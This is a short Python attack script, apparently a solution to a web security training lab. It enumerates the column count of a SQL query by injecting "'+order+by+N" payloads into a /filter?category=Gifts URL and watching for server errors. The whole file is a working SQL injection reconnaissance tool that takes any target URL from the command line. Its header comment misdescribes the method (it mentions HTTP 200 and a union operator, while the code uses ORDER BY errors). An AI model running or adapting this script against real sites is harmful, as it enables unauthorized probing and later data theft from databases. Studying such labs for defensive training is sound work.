# This script bruteforces http requests until it gets a HTTP200 with a sql union operator
import requests
import sys
import urllib3

def exploit(url):
    path = "/filter?category=Gifts"
    for i in range(1, 10):
        payload = "'+order+by+" + str(i)
        r = requests.get(url + path + payload)
        res = r.text
        if "Internal Server Error" in res:
            return i-1
        i+=1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print("[-] invalid syntax")
        print("[-] Useage: " + str(sys.argv[0]) + " <url> ")
        print("[-] Example: " + str(sys.argv[0]) + " www.example.com")
        sys.exit(-1)
    print("[+] starting attack")
    col = exploit(url)
    if col:
        print("[+] number of colums = ", col)
    else:
        print("[-] attack failed")